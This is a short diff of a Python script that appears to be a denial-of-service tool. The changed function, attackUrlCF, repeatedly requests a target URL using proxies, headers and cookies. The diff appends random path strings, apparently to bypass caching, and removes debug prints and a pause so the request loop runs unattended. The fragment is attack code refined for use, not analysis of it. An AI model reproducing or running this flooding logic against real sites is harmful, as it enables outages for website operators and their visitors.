@@ -95,7 +95,7 @@ def attackUrlCF(baseUrl, threadNumber):
 
 	while True:
 		try:
-			url = baseUrl #+ '/' + ''.join(random.choice(letters) for i in range(10)) 
+			url = baseUrl + '/' + ''.join(random.choice(letters) for i in range(10)) 
 			# url = baseUrl + '/author/jimmyaki/page/' + str(random.randint(1,100))
 
 			
@@ -113,11 +113,11 @@ def attackUrlCF(baseUrl, threadNumber):
 			# checkIp()
 			print(proxies, headers, cookiesStr)
 			
-			print(requests.get('http://httpbin.org/headers', headers=headers, cookies=cookiesStr).content)
-			print(requests.get('http://httpbin.org/ip', headers=headers, cookies=cookiesStr).content)
-			print(requests.get(url, headers=headers,  cookies=cookiesStr))
+			# print(requests.get('http://httpbin.org/headers', headers=headers, cookies=cookiesStr).content)
+			# print(requests.get('http://httpbin.org/ip', headers=headers, cookies=cookiesStr).content)
+			# print(requests.get(url, headers=headers,  cookies=cookiesStr))
 			# print(requests.get('http://httpbin.org/cookies', headers=headers, cookies=cookiesStr).content)
-			input()
+			# input()
 			# print(requests.get('http://myhttpheader.com/' , headers=headers, proxies=proxies).content)
 			# input()
 
